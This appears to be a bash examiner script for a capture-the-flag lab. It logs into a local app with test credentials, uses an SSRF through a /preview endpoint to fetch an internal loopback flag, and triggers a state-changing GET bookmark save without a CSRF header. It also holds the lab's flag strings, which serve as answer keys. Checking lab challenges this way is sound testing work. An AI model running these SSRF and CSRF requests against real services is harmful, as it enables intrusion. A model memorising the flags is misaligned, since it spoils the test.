#!/usr/bin/env bash
# Cycle-6 examiner dry-run: SSRF prize via preview + CSRF bookmark proof.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BASE="${BASE_URL:-http://localhost:8080/api}"
F1='OS{764e3877d12346b2f82978063872b4fe}'
F2='OS{919efee8674b0ad10774bd5233c70d76}'
JAR="$(mktemp /tmp/kc-c6-XXXXXX.jar)"
trap 'rm -f "$JAR"' EXIT

fail() { echo "FAIL: $1" >&2; exit 1; }

echo "== Cycle-6 examiner =="

echo "Login demo_user..."
LOGIN=$(curl -sS -c "$JAR" -b "$JAR" -X POST "${BASE}/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@kc.test","password":"UserPass123!"}') \
  || fail "login failed"
TOKEN=$(echo "$LOGIN" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
[[ -n "$TOKEN" ]] || fail "no access token: $LOGIN"
echo "  OK"

echo "SSRF via POST /preview → loopback prize..."
# Inside backend container Nest listens on :4000
PREV=$(curl -sS -X POST "${BASE}/preview" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:4000/internal/cycle6-flag"}') \
  || fail "preview failed"
echo "$PREV" | grep -q "$F1" || fail "F1 not in preview snippet: $PREV"
echo "  OK (F1)"

echo "CSRF plant: GET /auth/bookmarks/save (cookie, no CSRF header)..."
SAVE=$(curl -sS -c "$JAR" -b "$JAR" \
  "${BASE}/auth/bookmarks/save?url=https://example.com/c6-csrf") \
  || fail "bookmark save failed"
echo "$SAVE" | grep -q "$F2" || fail "F2 not in bookmark response: $SAVE"
echo "  OK (F2)"

echo "Refresh still requires CSRF header..."
CODE=$(curl -sS -o /tmp/kc-c6-refresh.body -w '%{http_code}' -c "$JAR" -b "$JAR" \
  -X POST "${BASE}/auth/refresh" \
  -H 'Content-Type: application/json' \
  -d '{}') || true
[[ "$CODE" == "403" ]] || fail "expected 403 without CSRF, got $CODE: $(cat /tmp/kc-c6-refresh.body)"
echo "  OK (403)"

echo "Cycle-6 examiner passed."
